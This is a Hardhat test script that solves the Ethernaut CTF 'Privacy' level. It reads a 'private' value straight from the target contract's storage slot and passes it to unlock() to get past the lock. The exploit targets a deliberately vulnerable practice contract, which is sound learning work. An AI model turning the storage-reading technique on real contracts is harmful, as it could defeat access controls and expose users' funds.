import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";
import { stat } from "fs";

describe("Privacy", function(){
    it("Aims to Solve the Privacy Question of the Ethernaut CTF", async function(){

        this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)


        // Define Target ABI
        const targetABI = [
            "function unlock(bytes16 _key) public", 
            "function locked() public view returns (bool)",
        ]

        const targetAddr = "0x10d08147513CAF302Bb13083e4bD1B2Df45B2486"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // Read Target Contract's Storage
        let data_slot = await eoa.provider!.getStorageAt(targetAddr, 5); // Since Private data is the 6th Variable

        let key_data = data_slot.slice(2, 34); // Read the Second Element of the data Variable 

        let key = "0x" + key_data // Convert it to Hex

        let transaction =  await targetCont.unlock(key);
        await transaction.wait()
        
        // Final Check
        let lock_status = await targetCont.locked();
        expect(lock_status).to.eq(false);
        
    });
});